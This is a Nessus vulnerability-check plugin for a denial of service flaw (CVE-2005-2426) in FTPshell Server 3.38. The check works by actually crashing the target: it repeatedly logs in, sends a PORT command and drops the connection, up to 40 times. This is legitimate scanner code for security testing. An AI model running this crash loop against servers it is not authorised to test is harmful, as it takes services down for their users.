#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19303);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-2426");
  script_bugtraq_id(14382);
  script_osvdb_id(18285);

  script_name(english:"FTPshell Server 3.38 Malformed PORT/QUIT DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP service is affected by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is using FTPshell, an FTP service for Windows. 

The version of FTPshell installed on the remote host suffers from a
denial of service vulnerability that can be exploited by logging into
the service, sending a PORT command, and closing the connection without
QUITing, all 39 times." );
 script_set_attribute(attribute:"see_also", value:"http://reedarvin.thearvins.com/20050725-01.html" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Jul/538" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/25");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for denial of service vulnerability in FTPshell 3.38");
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_ftp_port(default: 21);

# If it's for FTPshell...
banner = get_ftp_banner(port:port);
if (
  banner &&  
  egrep(string:banner, pattern:"^220[ -] FTPshell Server Service")
) {
  # nb: to exploit the vulnerability we need to log in.
  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");
  if (!user || !pass) {
    exit(0, "ftp/login and/or ftp/password are empty");
  }

  # Try to exploit the flaw.
  #
  # nb: we iterate one extra time to check if the service has crashed.
  max = 40;
  for (i=1; i<=max; i++) {
    soc = open_sock_tcp(port);

    # If we could open a socket...
    if (soc) {
      # nb: this sleep doesn't seem necessary but exists in the PoC.
      # sleep(1);
      if (ftp_authenticate(socket:soc, user:user, pass:pass)) {
        # nb: there seems to be a timing issue as without this
        #     sleep the DoS doesn't work.
        sleep(1);

        # Send a PORT command.
        c = string("PORT 127,0,0,1,18,12");
        send(socket:soc, data:string(c, "\r\n"));
        s = ftp_recv_line(socket:soc);

        if (s) {
          # nb: this sleep doesn't seem necessary but exists in the PoC.
          # sleep(1);

          # Close the socket (don't QUIT).
          close(soc);
        }
      }
      else if (i == 1) {
        close(soc);
        exit(1, "Cannot login on port "+port+" with supplied FTP credentials");
      }
    }
    # If we couldn't open a socket after at least 1 iteration, there's a problem.
    else if (i > 1) {
      security_warning(port);
      exit(0);
    }
  }
}
